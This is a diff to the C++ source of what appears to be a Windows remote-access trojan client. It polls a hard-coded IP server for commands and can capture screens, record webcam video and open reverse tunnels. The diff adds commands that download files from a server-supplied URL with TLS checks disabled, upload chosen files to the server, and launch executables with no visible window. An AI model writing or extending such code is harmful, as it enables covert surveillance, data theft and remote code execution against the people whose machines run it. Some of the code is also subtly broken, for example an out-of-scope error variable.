@@ -3,6 +3,7 @@
 #include <string>
 #include <regex>
 #include <chrono>
+#include <ctime>
 #include <cstdio>
 #include <thread>
 #include <filesystem>
@@ -13,12 +14,21 @@
 #include "ctun.h"
 #include "camera.h"
 
-
 struct CommandInfo {
     std::string command;
     std::string uuid;
     std::string extra;
 };
+
+
+std::string getCurrentDateTime() {
+    auto now = std::chrono::system_clock::now();
+    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
+    std::stringstream ss;
+    ss << std::put_time(std::localtime(&now_time), "%Y%m%d%H%M%S");
+    return ss.str();
+}
+
 
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
     size_t totalSize = size * nmemb;
@@ -121,6 +131,60 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     }
 }
 
+bool runInBackground(const char* executablePath) {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (CreateProcess(
+        NULL,
+        const_cast<char*>(executablePath),
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return true; 
+    } else {       
+        return false; 
+    }
+}
+
+bool downloadFile(const std::string& url, const std::string& destinationPath) {
+    CURL* curl;
+    CURLcode res;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if (curl) {
+        FILE* fp = fopen(destinationPath.c_str(), "wb");
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        fclose(fp);
+
+        if (res != CURLE_OK) {           
+            return false;
+        }
+        return true;
+    }
+    return false;
+}
 
 int main() {
     const char* loginUrl = "https://16.16.16.114:5000/login";
@@ -210,8 +274,8 @@ int main() {
             screenCapture.CaptureScreensAndSave();
             std::cout << "Screen capture completed!" << std::endl;
 
-            const char* outputArchiveNamePatternBMP = "*.bmp";
-            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);
+            const char* outputArchiveNamePattern = "*.bmp";
+            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);
 
             deleteFiles("bmp"); 
 
@@ -229,15 +293,87 @@ int main() {
             std::chrono::seconds duration(10);    
 
             recordVideo(cameraIndex, duration);
-            const char* outputArchiveNamePatternBMP = "*.avi";
-            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);
+            const char* outputArchiveNamePattern = "*.avi";
+            std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);
 
             deleteFiles("avi"); //
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
 
             performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+
+        } else if (commandInfo.command == "download_file") {
+            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
+            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
+            std::string downloadUrl = commandInfo.extra;
+            std::string uuid = commandInfo.uuid;
             
+            if (downloadUrl.empty()) {
+                std::cerr << "Error: Empty download URL." << std::endl;
+                return 1; 
+            }
+            std::string filename = std::filesystem::path(downloadUrl).filename().string();
+            std::string destinationPath = "./" + filename;
+
+            if (downloadFile(downloadUrl, destinationPath)) {
+                std::cout << "File downloaded successfully to: " << destinationPath << std::endl;
+            } else {
+                std::cerr << "Error downloading file: " << curl_easy_strerror(res) << std::endl;  
+            }
+
+        } else if (commandInfo.command == "upload_file") {
+            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
+            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
+            std::string filePath = commandInfo.extra;
+            std::string uuid = commandInfo.uuid;
+            if (filePath.empty()) {
+                std::cerr << "Error: Empty file path." << std::endl;
+                return 1; 
+            }
+
+            std::string filename = std::filesystem::path(filePath).filename().string();
+    
+
+            std::string compressedArchiveName = filename + ".tar.gz";
+            std::string compressedArchivePath = "./" + compressedArchiveName;
+            
+            compressFilesInCurrentDirectory(compressedArchivePath.c_str());
+            
+            if (std::filesystem::exists(compressedArchivePath)) {
+
+                performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+            } else {
+
+            }           
+            
+        } else if (commandInfo.command == "execute_exe") {
+            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
+            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
+            std::string executablePath;  
+            std::string executableFilename = commandInfo.extra;
+
+            if (executableFilename.empty()) { 
+                std::cerr << "Error: Empty executable filename." << std::endl;
+                return 1; 
+            }
+     
+            if (executableFilename.find('/') == std::string::npos && executableFilename.find('\\') == std::string::npos) {
+                executableFilename = "./" + executableFilename;
+            }
+      
+            if (std::filesystem::exists(executableFilename)) {
+            
+                if (runInBackground(executableFilename.c_str())) {
+                    std::cout << "Program " << executablePath << " executed in the background." << std::endl;
+                } else {
+                    std::cerr << "Error executing " << executablePath << " in the background. Error code: " << GetLastError() << std::endl;
+                }
+            } else {
+                std::cerr << "Error: Executable file does not exist at path: " << executableFilename << std::endl;
+            
+            }
+            
+                       
         } else if (commandInfo.command == "rev_tun_port") {
             std::cout << "Executing reverse tunneling..." << std::endl;
             std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
@@ -261,7 +397,7 @@ int main() {
                 tunnelingClient->closeTunnels();
                 delete tunnelingClient;
 
-                return 0;
+                
             } else {
                 std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
             }
